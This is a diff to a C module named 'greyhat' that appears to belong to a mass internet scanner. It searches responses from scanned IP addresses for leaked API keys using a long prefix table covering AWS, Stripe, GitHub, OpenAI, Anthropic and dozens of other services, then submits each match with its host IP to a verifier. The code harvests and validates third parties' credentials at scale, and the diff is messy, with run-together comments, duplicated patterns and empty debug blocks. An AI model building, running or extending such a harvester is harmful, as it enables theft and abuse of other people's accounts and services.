@@ -9,6 +9,7 @@
 #include <pthread.h>
 #include <ctype.h>
 #include <time.h>
+#include <unistd.h>
 
 struct SMACK *greyhat_smack;
 pthread_mutex_t greyhat_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -57,129 +58,135 @@ struct KeyPattern {
     const char *provider, *category;
 };
 static const struct KeyPattern key_patterns[] = {
-    /* AWS - verifiable via SDK (can't HTTP verify) */
+    /* AWS - 4 char prefix, distinctive */
     {"AKIA", 16, 25, "AWS Access Key ID", "aws"},
     {"ASIA", 16, 25, "AWS Temporary Access Key", "aws"},
-    /* OpenAI - api.openai.com/v1/models */
-    {"sk-proj-", 16, 100, "OpenAI Project Key", "openai"},
-    {"sk-", 16, 100, "OpenAI API Key", "openai"},
-    /* Google - www.googleapis.com/youtube */
-    {"AIza", 16, 60, "Google API Key", "google"},
+    /* OpenAI - distinctive prefix */    /* Google - distinctive */
+    {"AIzaSy", 16, 60, "Google API Key", "google"},
     {"ya29.", 20, 500, "Google OAuth2 Token", "google"},
-    /* GitHub - api.github.com */
+    /* GitHub - distinctive */
     {"ghp_", 16, 100, "GitHub Personal Access Token", "github"},
     {"gho_", 16, 100, "GitHub OAuth Token", "github"},
     {"ghu_", 16, 100, "GitHub User-to-Server Token", "github"},
     {"ghs_", 16, 100, "GitHub Server-to-Server Token", "github"},
     {"github_pat_", 16, 200, "GitHub Fine-Grained PAT", "github"},
-    /* Stripe - api.stripe.com/v1/charges */
-    {"sk_live_", 16, 100, "Stripe Secret Key (Live)", "stripe"},
+    /* Stripe - distinctive */    {"pk_live_", 16, 100, "Stripe Publishable Key (Live)", "stripe"},    {"rk_live_", 16, 100, "Stripe Restricted Key (Live)", "stripe"},
+    {"rk_test_", 16, 100, "Stripe Restricted Key (Test)", "stripe"},
+    {"whsec_", 16, 80, "Stripe Webhook Secret", "stripe"},
+    /* Slack - distinctive */    /* Datadog - use full prefix */    /* CircleCI */
+    {"cci_", 16, 80, "CircleCI API Token", "circleci"},
+    /* HuggingFace */    /* Discord */    /* Twitter/X */
+    {"AAAAAAAA", 20, 200, "Twitter Bearer Token", "twitter"},
+    /* Groq */
+    {"gsk_", 16, 80, "Groq API Key", "groq"},
+    /* Anthropic */    /* Twilio */    /* DigitalOcean */
+    {"dop_v1_", 30, 150, "DigitalOcean API Token", "digitalocean"},
+    {"doa_", 16, 150, "DigitalOcean OAuth Token", "digitalocean"},
+    /* GitLab */
+    {"glpat-", 16, 80, "GitLab Personal Access Token", "gitlab"},
+    {"glft-", 16, 80, "GitLab Feed Token", "gitlab"},
+    {"GR1348941", 16, 80, "GitLab Runner Token", "gitlab"},
+    /* SendGrid */
+    {"SG.", 16, 120, "SendGrid API Key", "sendgrid"},
+    /* Fastly */
+    {"FASTLY_", 16, 80, "Fastly API Token", "fastly"},
+    /* Cohere */
+    {"cohere-", 16, 80, "Cohere API Key", "cohere"},
+    /* DeepSeek */    /* Fireworks */    {"fireworks-", 16, 80, "Fireworks AI Token", "fireworks"},
+    /* Mistral */
+    {"mistral-", 16, 80, "Mistral AI API Key", "mistral"},
+    /* Nvidia */
+    {"nvapi-", 16, 80, "Nvidia NIM API Key", "nvidia"},
+    /* Together */
+    {"together-", 16, 80, "Together AI API Key", "together"},
+    /* Azure/JWT */    {"0.AAA", 16, 200, "Azure AD Token", "azure"},
+    /* Alibaba */
+    {"LTAI", 12, 60, "Alibaba Cloud Access Key", "alibaba"},
+    /* Cloudflare */
+    {"cloudflare_", 16, 80, "Cloudflare API Token", "cloudflare"},
+    /* Heroku */
+    {"HRKU", 16, 80, "Heroku API Key", "heroku"},
+    /* PyPI */
+    {"pypi-", 16, 100, "PyPI API Token", "pypi"},
+    /* Mailgun */    /* Replicate */    /* ElevenLabs */
+    {"elevenlabs-", 16, 80, "ElevenLabs API Key", "elevenlabs"},
+    /* Square */
+    {"sq0atp-", 10, 50, "Square Access Token", "square"},
+    {"sq0csp-", 16, 100, "Square Application Secret", "square"},
+    /* Linear */
+    {"lin_api_", 16, 80, "Linear API Key", "linear"},
+    /* Sentry */
+    {"sntrys_", 16, 100, "Sentry Auth Token", "sentry"},
+    /* NPM */
+    {"npm_", 16, 100, "NPM Access Token", "npm"},
+    /* RubyGems */
+    {"rubygems_", 16, 80, "RubyGems API Key", "rubygems"},
+    /* Flutterwave */
+    {"FLWSECK_", 16, 80, "Flutterwave Secret Key", "flutterwave"},
+    /* AssemblyAI */
+    {"assemblyai_", 16, 80, "AssemblyAI API Key", "assemblyai"},
+    /* Vercel */
+    {"vercel_", 10, 80, "Vercel API Token", "vercel"},
+    /* OpenRouter */    /* Voyage */
+    {"voyage-", 16, 80, "Voyage AI API Key", "voyage"},
+    /* PayPal */
+    {"A21A", 16, 80, "PayPal Client ID", "paypal"},
+    /* Meta/Facebook */
+    {"EAAC", 20, 500, "Facebook Access Token", "meta"},
+    {"EAAG", 20, 500, "Facebook Graph API Token", "meta"},
+    {"EAAE", 20, 500, "Facebook Enterprise Token", "meta"},
+    /* Databricks */    /* TikTok */
+    {"act_", 16, 60, "TikTok Advertiser Token", "tiktok"},    /* Re-added patterns that actually match real keys */
     {"pk_live_", 16, 100, "Stripe Publishable Key (Live)", "stripe"},
+    {"sk_live_", 16, 100, "Stripe Secret Key (Live)", "stripe"},
     {"sk_test_", 16, 100, "Stripe Secret Key (Test)", "stripe"},
     {"rk_live_", 16, 100, "Stripe Restricted Key (Live)", "stripe"},
     {"rk_test_", 16, 100, "Stripe Restricted Key (Test)", "stripe"},
     {"whsec_", 16, 80, "Stripe Webhook Secret", "stripe"},
-    /* Slack - slack.com/api/auth.test */
+    {"cus_", 16, 80, "Stripe Customer ID", "stripe"},
+    {"sk-proj-", 16, 100, "OpenAI Project Key", "openai"},
+    {"sk-ant-", 16, 100, "Anthropic API Key", "anthropic"},
+    {"sk-or-", 16, 100, "DeepSeek/OpenRouter Key", "deepseek"},
+    {"sk-or-v1-", 16, 100, "OpenRouter API Key", "openrouter"},
+    {"ghp_", 16, 100, "GitHub Personal Access Token", "github"},
+    {"gho_", 16, 100, "GitHub OAuth Token", "github"},
     {"xoxb-", 8, 100, "Slack Bot Token", "slack"},
     {"xoxp-", 8, 100, "Slack User Token", "slack"},
-    {"xoxa-", 8, 100, "Slack App Token", "slack"},
-    {"xoxr-", 8, 100, "Slack Refresh Token", "slack"},
-    {"xoxs-", 8, 100, "Slack Shared Token", "slack"},
-    {"xapp-", 8, 100, "Slack App-Level Token", "slack"},
-    /* Datadog - api.datadoghq.com/api/v1/user */
-    {"dd", 20, 50, "Datadog API Key", "datadog"},
-    /* CircleCI - circleci.com/api/v2/me */
-    {"cci_", 16, 80, "CircleCI API Token", "circleci"},
-    /* HuggingFace - huggingface.co/api/whoami-v2 */
-    {"hf_", 16, 80, "Hugging Face Token", "hf"},
-    /* Discord - discord.com/api/users/@me */
-    {"Bot ", 40, 100, "Discord Bot Token", "discord"},
-    {"MTE", 50, 80, "Discord Bot Token (Base64)", "discord"},
-    /* Twitter/X - api.twitter.com/2/tweets */
-    {"AAAAAAAA", 20, 200, "Twitter Bearer Token", "twitter"},
-    /* Groq - api.groq.com/openai/v1/models */
-    {"gsk_", 16, 80, "Groq API Key", "groq"},
-    /* Anthropic - api.anthropic.com/v1/models */
-    {"sk-ant-", 16, 100, "Anthropic API Key", "anthropic"},
-    {"sk-ant-api", 16, 100, "Anthropic API Key (full)", "anthropic"},
-    /* Twilio - api.twilio.com/2010-04-01/Accounts */
-    {"AC", 20, 40, "Twilio Account SID", "twilio"},
-    {"SK", 20, 50, "Twilio API Key SID", "twilio"},
-    /* DigitalOcean - api.digitalocean.com/v2/account */
     {"dop_v1_", 30, 150, "DigitalOcean API Token", "digitalocean"},
-    {"doa_", 16, 150, "DigitalOcean OAuth Token", "digitalocean"},
-    /* GitLab - gitlab.com/api/v4/user */
     {"glpat-", 16, 80, "GitLab Personal Access Token", "gitlab"},
-    {"glft-", 16, 80, "GitLab Feed Token", "gitlab"},
     {"GR1348941", 16, 80, "GitLab Runner Token", "gitlab"},
-    /* SendGrid - api.sendgrid.com/v3/user */
-    {"SG.", 16, 120, "SendGrid API Key", "sendgrid"},
-    /* Fastly - api.fastly.com/currentuser */
-    {"FASTLY_", 16, 80, "Fastly API Token", "fastly"},
-    /* Cohere - api.cohere.ai/v1/models */
+    {"gsk_", 16, 80, "Groq API Key", "groq"},
     {"cohere-", 16, 80, "Cohere API Key", "cohere"},
-    /* DeepSeek - api.deepseek.com/user */
-    {"sk-or-", 16, 100, "DeepSeek API Key", "deepseek"},
-    /* Fireworks - api.fireworks.ai/inference/v1/models */
-    {"fw_", 16, 80, "Fireworks AI API Key", "fireworks"},
-    {"fireworks-", 16, 80, "Fireworks AI Token", "fireworks"},
-    /* Mistral - api.mistral.ai/v1/models */
     {"mistral-", 16, 80, "Mistral AI API Key", "mistral"},
-    /* Nvidia - integrate.api.nvidia.com/v1/models */
+    {"fireworks-", 16, 80, "Fireworks AI Token", "fireworks"},
     {"nvapi-", 16, 80, "Nvidia NIM API Key", "nvidia"},
-    /* Together - api.together.xyz/v1/models */
     {"together-", 16, 80, "Together AI API Key", "together"},
-    /* Azure/JWT - management.azure.com/subscriptions */
-    {"eyJ", 50, 3000, "JWT Token", "jwt"},
-    {"0.AAA", 16, 200, "Azure AD Token", "azure"},
-    {"EAA", 20, 500, "Microsoft/Google Token", "azure"},
-    /* Alibaba - dashscope.aliyuncs.com/compatible-mode/v1/models */
-    {"LTAI", 12, 60, "Alibaba Cloud Access Key", "alibaba"},
-    {"sk-", 20, 80, "Alibaba DashScope Key", "alibaba"},
-    /* Cloudflare - api.cloudflare.com/client/v4/user/tokens/verify */
-    {"cloudflare_", 16, 80, "Cloudflare API Token", "cloudflare"},
-    /* Heroku - api.heroku.com/account */
-    {"HRKU", 16, 80, "Heroku API Key", "heroku"},
-    /* PyPI - pypi.org/_/api/accounts/me/ */
-    {"pypi-", 16, 100, "PyPI API Token", "pypi"},
-    /* Mailgun - api.mailgun.net/v3/domains */
-    {"key-", 16, 80, "Mailgun API Key", "mailgun"},
-    /* Replicate - api.replicate.com/v1/user */
-    {"r8_", 16, 80, "Replicate API Token", "replicate"},
-    /* ElevenLabs - api.elevenlabs.io/v1/user */
-    {"elevenlabs-", 16, 80, "ElevenLabs API Key", "elevenlabs"},
-    /* Square - connect.squareup.com/v2/locations */
-    {"sq0atp-", 10, 50, "Square Access Token", "square"},
-    {"sq0csp-", 16, 100, "Square Application Secret", "square"},
-    /* Linear - api.linear.app/graphql */
-    {"lin_api_", 16, 80, "Linear API Key", "linear"},
-    /* Sentry - sentry.io/api/0/ */
-    {"sntrys_", 16, 100, "Sentry Auth Token", "sentry"},
-    /* NPM - registry.npmjs.org/-/npm/v1/user */
-    {"npm_", 16, 100, "NPM Access Token", "npm"},
-    /* RubyGems - rubygems.org/api/v1/profiles/me.json */
-    {"rubygems_", 16, 80, "RubyGems API Key", "rubygems"},
-    /* Flutterwave - api.flutterwave.com/v3/balances */
-    {"FLWSECK_", 16, 80, "Flutterwave Secret Key", "flutterwave"},
-    /* AssemblyAI - api.assemblyai.com/v1/user */
     {"assemblyai_", 16, 80, "AssemblyAI API Key", "assemblyai"},
-    /* Vercel - api.vercel.com/v2/user */
+    {"elevenlabs-", 16, 80, "ElevenLabs API Key", "elevenlabs"},
+    {"rubygems_", 16, 80, "RubyGems API Key", "rubygems"},
+    {"FLWSECK_", 16, 80, "Flutterwave Secret Key", "flutterwave"},
+    {"sntrys_", 16, 100, "Sentry Auth Token", "sentry"},
+    {"lin_api_", 16, 80, "Linear API Key", "linear"},
+    {"pypi-", 16, 100, "PyPI API Token", "pypi"},
+    {"HRKU", 16, 80, "Heroku API Key", "heroku"},
+    {"FASTLY_", 16, 80, "Fastly API Token", "fastly"},
+    {"cloudflare_", 16, 80, "Cloudflare API Token", "cloudflare"},
     {"vercel_", 10, 80, "Vercel API Token", "vercel"},
-    /* OpenRouter - openrouter.ai/api/v1/auth/key */
-    {"sk-or-v1-", 16, 100, "OpenRouter API Key", "openrouter"},
-    /* Voyage - api.voyageai.com/v1/models */
+    {"sq0csp-", 16, 100, "Square Application Secret", "square"},
+    {"sq0atp-", 10, 50, "Square Access Token", "square"},
     {"voyage-", 16, 80, "Voyage AI API Key", "voyage"},
-    /* PayPal - api-m.paypal.com/v1/oauth2/token */
-    {"A21A", 16, 80, "PayPal Client ID", "paypal"},
-    /* Meta/Facebook - graph.facebook.com/me */
     {"EAAC", 20, 500, "Facebook Access Token", "meta"},
     {"EAAG", 20, 500, "Facebook Graph API Token", "meta"},
-    {"EAAE", 20, 500, "Facebook Enterprise Token", "meta"},
-    /* Databricks */
+    {"A21A", 16, 80, "PayPal Client ID", "paypal"},
+    {"AAAAAAAA", 20, 200, "Twitter Bearer Token", "twitter"},
+    {"ya29.", 20, 500, "Google OAuth2 Token", "google"},
+    {"AIzaSy", 16, 60, "Google API Key", "google"},
+    {"LTAI", 12, 60, "Alibaba Cloud Access Key", "alibaba"},
     {"dapi", 16, 100, "Databricks API Token", "databricks"},
-    /* TikTok - open.tiktokapis.com/v2/oauth/token/ */
     {"act_", 16, 60, "TikTok Advertiser Token", "tiktok"},
-    {"tt_", 16, 80, "TikTok API Token", "tiktok"},
+    {"cci_", 16, 80, "CircleCI API Token", "circleci"},
+    {"SG.", 16, 120, "SendGrid API Key", "sendgrid"},
+    {"ey", 50, 3000, "JWT Token", "jwt"},
     {NULL, 0, 0, NULL, NULL}
 };
 
@@ -188,15 +195,21 @@ struct VerificationTask {
     char ip[64], key[512], metadata[1024];
     struct VerificationTask *next;
 };
-static struct VerificationTask *queue_head = NULL;
-static struct VerificationTask *queue_tail = NULL;
 
 static void enqueue_task(struct VerificationTask *task) {
-    pthread_mutex_lock(&greyhat_mutex);
-    if (queue_tail) { queue_tail->next = task; queue_tail = task; }
-    else { queue_head = queue_tail = task; }
-    pthread_cond_signal(&greyhat_cond);
-    pthread_mutex_unlock(&greyhat_mutex);
+    /* Directly submit to verifier - no queue needed */
+    char provider[128] = "Unknown", category[64] = "unknown";
+    if (task->metadata[0]) {
+        char *sep = strchr(task->metadata, '|');
+        if (sep) {
+            int pl = (int)(sep - task->metadata); if (pl >= 128) pl = 127;
+            strncpy(provider, task->metadata, pl); provider[pl] = 0;
+            strncpy(category, sep+1, 63); category[63] = 0;
+        } else { strncpy(provider, task->metadata, 127); provider[127] = 0; }
+    }
+    verifier_submit(task->ip, task->key, provider, category);
+    total_keys_found++;
+    free(task);
 }
 
 static int is_valid_key_char(char c) {
@@ -206,6 +219,8 @@ static int is_valid_key_char(char c) {
 static void extract_and_enqueue(const char *ip_str, const unsigned char *px, unsigned length, unsigned offset, size_t id, int is_test) {
     char key[512] = {0};
     int key_len = 0, start_offset = offset - 1;
+    /* Debug: show what smack found */
+    
     if (id == ID_LABEL) {
         while (start_offset < (int)length && (isalnum(px[start_offset]) || px[start_offset] == '-' || px[start_offset] == '_')) start_offset++;
         while (start_offset < (int)length && (isspace(px[start_offset]) || px[start_offset] == ':' || px[start_offset] == '=' || px[start_offset] == '"' || px[start_offset] == '\'')) start_offset++;
@@ -217,18 +232,18 @@ static void extract_and_enqueue(const char *ip_str, const unsigned char *px, uns
         if (is_valid_key_char(c)) { key[i] = c; key_len = i + 1; } else break;
     }
     key[key_len] = '\0';
-    if (!is_test && is_duplicate(ip_str, key)) return;
-    if (strstr(key, "AKIAIOSFODNN7EXAMPLE") != NULL) return;
-    if (strncmp(key, "iVBOR", 5) == 0 || strncmp(key, "R0lGOD", 6) == 0 || strncmp(key, "/9j/", 4) == 0) return;
-    if (strncmp(key, "MII", 3) == 0 && key_len > 100) return;
-    if (strncmp(key, "data:", 5) == 0) return;
-    if (strncmp(key, "http://", 7) == 0 || strncmp(key, "https://", 8) == 0) return;
-    if (strncmp(key, "-----BEGIN", 10) == 0) return;
-    if (key_len < 6) return;
+    if (!is_test && is_duplicate(ip_str, key)) {  return; }
+    if (strstr(key, "AKIAIOSFODNN7EXAMPLE") != NULL) {  return; }
+    if (strncmp(key, "iVBOR", 5) == 0 || strncmp(key, "R0lGOD", 6) == 0 || strncmp(key, "/9j/", 4) == 0) {  return; }
+    if (strncmp(key, "MII", 3) == 0 && key_len > 100) {  return; }
+    if (strncmp(key, "data:", 5) == 0) {  return; }
+    if (strncmp(key, "http://", 7) == 0 || strncmp(key, "https://", 8) == 0) {  return; }
+    if (strncmp(key, "-----BEGIN", 10) == 0) {  return; }
+    if (key_len < 10) {  return; }
     /* Reject placeholder keys */
     int same_char = 1;
     for (int i = 1; i < key_len; i++) { if (key[i] != key[0]) { same_char = 0; break; } }
-    if (same_char) return;
+    if (same_char) {  return; }
     if (key_len > 20) {
         int max_count = 0;
         for (int ci = 0; ci < key_len; ci++) {
@@ -236,7 +251,7 @@ static void extract_and_enqueue(const char *ip_str, const unsigned char *px, uns
             for (int cj = ci; cj < key_len; cj++) if (key[cj] == key[ci]) count++;
             if (count > max_count) max_count = count;
         }
-        if (max_count * 100 / key_len > 80) return;
+        if (max_count * 100 / key_len > 80) {  return; }
     }
     int pass = 0;
     const char *detected_provider = "Unknown", *detected_category = "unknown";
@@ -245,10 +260,13 @@ static void extract_and_enqueue(const char *ip_str, const unsigned char *px, uns
     } else {
         for (int i = 0; key_patterns[i].prefix != NULL; i++) {
             if (strncmp(key, key_patterns[i].prefix, strlen(key_patterns[i].prefix)) == 0) {
-                int mn = key_patterns[i].min_len, mx = key_patterns[i].max_len;
+                int mn = key_patterns[i].min_len;
                 if (key_len >= mn) {
                     pass = 1; detected_provider = key_patterns[i].provider; detected_category = key_patterns[i].category;
+                    
                     break;
+                } else {
+                    
                 }
             }
         }
@@ -274,6 +292,8 @@ static void extract_and_enqueue(const char *ip_str, const unsigned char *px, uns
         }
     }
     if (pass) {
+        
+        
         if (!is_test) add_to_cache(ip_str, key);
         struct VerificationTask *task = CALLOC(1, sizeof(*task));
         strncpy(task->ip, ip_str, sizeof(task->ip)-1); task->ip[sizeof(task->ip)-1] = '\0';
@@ -293,6 +313,7 @@ void greyhat_scan(ipaddress ip, const unsigned char *px, unsigned length) {
     ipaddress_formatted_t fmt = ipaddress_fmt(ip);
     strncpy(ip_str, fmt.string, sizeof(ip_str)); ip_str[sizeof(ip_str)-1] = '\0';
     total_sites_checked++;
+    
     if (length > 10) {
         const char *data = (const char *)px;
         if (strcasestr(data, "<script") || strcasestr(data, "<style") || strcasestr(data, "<html")) {
@@ -302,7 +323,10 @@ void greyhat_scan(ipaddress ip, const unsigned char *px, unsigned length) {
     }
     while (offset < length) {
         size_t id = smack_search_next(greyhat_smack, &state, px, &offset, length);
-        if (id != SMACK_NOT_FOUND) extract_and_enqueue(ip_str, px, length, offset, id, 0);
+        if (id != SMACK_NOT_FOUND) {
+            
+            extract_and_enqueue(ip_str, px, length, offset, id, 0);
+        }
     }
 }
 
@@ -315,26 +339,4 @@ void greyhat_init(void) {
     smack_compile(greyhat_smack);
 }
 
-void *greyhat_thread(void *arg) {
-    (void)arg;
-    while (1) {
-        struct VerificationTask *task = NULL;
-        pthread_mutex_lock(&greyhat_mutex);
-        while (queue_head == NULL) pthread_cond_wait(&greyhat_cond, &greyhat_mutex);
-        task = queue_head; queue_head = task->next; if (queue_head == NULL) queue_tail = NULL;
-        pthread_mutex_unlock(&greyhat_mutex);
-        char provider[128] = "Unknown", category[64] = "unknown";
-        if (task->metadata[0]) {
-            char *sep = strchr(task->metadata, '|');
-            if (sep) {
-                int pl = (int)(sep - task->metadata); if (pl >= 128) pl = 127;
-                strncpy(provider, task->metadata, pl); provider[pl] = '\0';
-                strncpy(category, sep+1, 63); category[63] = '\0';
-            } else { strncpy(provider, task->metadata, 127); provider[127] = '\0'; }
-        }
-        verifier_submit(task->ip, task->key, provider, category);
-        total_keys_found++;
-        free(task);
-    }
-    return NULL;
-}
+void *greyhat_thread(void *arg) { (void)arg; return NULL; }
